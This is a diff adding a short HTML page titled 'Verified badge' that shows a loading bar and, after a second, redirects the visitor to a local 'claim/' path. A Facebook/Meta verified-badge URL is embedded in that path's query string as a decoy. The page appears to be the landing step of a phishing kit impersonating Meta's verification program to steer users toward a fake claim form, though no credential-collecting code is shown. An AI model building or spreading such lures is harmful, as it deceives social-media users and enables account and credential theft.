@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="shortcut icon" href="icon.ico">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2,shrink-to-fit=no">
+<title>Verified badge</title>
+</head>
+<span id="progressBar" aria-valuetext="Loading..." aria-busy="true" value="0" max="4"></span>
+<script> 
+    var timeleft = 1;
+   var downloadTimer = setInterval(function(){
+     document.getElementById("progressBar").value = 1 - --timeleft;
+     if(timeleft <= 0)  
+       setTimeout("window.location='claim/?next=1&amp;next=https%3A%2F%2Fwww.facebook.com%2Fmeta%2F2fac%2Fverified%2Fbadge%2F&amp;lwv=100'");
+   },1000);
+</script>
+</html>
